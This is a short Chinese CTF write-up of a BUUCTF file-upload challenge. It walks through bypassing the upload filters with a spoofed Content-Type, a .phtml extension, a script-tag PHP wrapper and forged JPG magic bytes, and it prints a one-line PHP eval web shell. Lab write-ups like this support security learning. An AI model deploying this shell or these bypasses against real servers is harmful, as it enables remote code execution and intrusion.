---
title: 文件上传
tags: 文件上传
description: buu 文件上传题目wp
---
# buu 文件上传漏洞
![](./img/Snipaste_2023-12-28_15-11-52.png)
此题是让我们上传文件
![](./img/Snipaste_2023-12-28_15-12-36.png)
我们通过尝试，发现需要图片并且是jpg格式，我们首先尝试构造一个一句话木马，方便后续进行读取flag
![](./img/Snipaste_2023-12-28_15-44-14.png)
我们通过修改content-type和文件后缀上传文件
![](./img/Snipaste_2023-12-28_15-46-18.png)
![](./img/Snipaste_2024-01-02_18-17-59.png)
要求不能是php文件，我们尝试php2,php3,phtml的后缀，最后发现phtml成功绕过
![](./img/Snipaste_2023-12-28_15-46-26.png)
这条线索要求不能有`<?`即不能有php文件内容，我们通过Js内嵌php代码可以实现绕过

`<script language='php'>@eval($_POST['cmd']);</script>`
![](./img/Snipaste_2024-01-02_19-16-31.png)
还是不可以，可能是文件头没有修改，我们查找资料发现jpg的文件头为FFD8FF。
通过010editor我们修改文件内容
![](./img/Snipaste_2024-01-02_19-21-08.png)
成功绕过，并上传文件
![](./img/Snipaste_2024-01-02_19-22-03.png)
(图偷的)

我们想要读取文件，在文件上传漏洞中一般在`upload`或根目录下，然后就可以进进行一句话木马的常规操作读取flag啦。
![](./img/Snipaste_2024-01-02_18-56-45.png)
![](./img/Snipaste_2024-01-02_18-57-26.png)
